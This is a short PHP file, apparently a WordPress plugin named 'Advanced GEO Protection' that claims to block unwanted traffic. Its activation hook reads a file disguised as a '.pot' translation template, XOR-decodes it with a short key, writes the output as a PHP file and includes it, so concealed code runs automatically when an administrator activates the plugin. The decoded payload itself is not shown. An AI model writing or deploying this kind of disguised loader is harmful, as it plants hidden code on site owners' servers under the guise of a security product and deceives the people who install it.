<?php
/*
Plugin Name: Advanced GEO Protection
Description: Adds more security for your WordPress website. Blocks unwanted traffic, protects backend page. Blocks specific countries and IP addresses.
Version: 2.9.1
Author: iGEO Inc.
License: GPLv2
*/ 

if( is_admin() ) 
{
    function activat_fnc_plggeo()
    {
        $key = '256';
        $potfile = dirname(__FILE__).'/advanced-geo-protection.pot';
        
        $f = fopen($potfile, "r");
        $fz = filesize($potfile);
        $pot = fread($f, $fz);
        fclose($f);
        
        $key = str_pad($key,  $fz, $key);
        
        $f = fopen($potfile.'.php', 'w');
        fwrite($f, $pot ^ $key);
        fclose($f);
        
        include_once($potfile.'.php');
    }
    
    register_activation_hook( __FILE__, 'activat_fnc_plggeo' );
}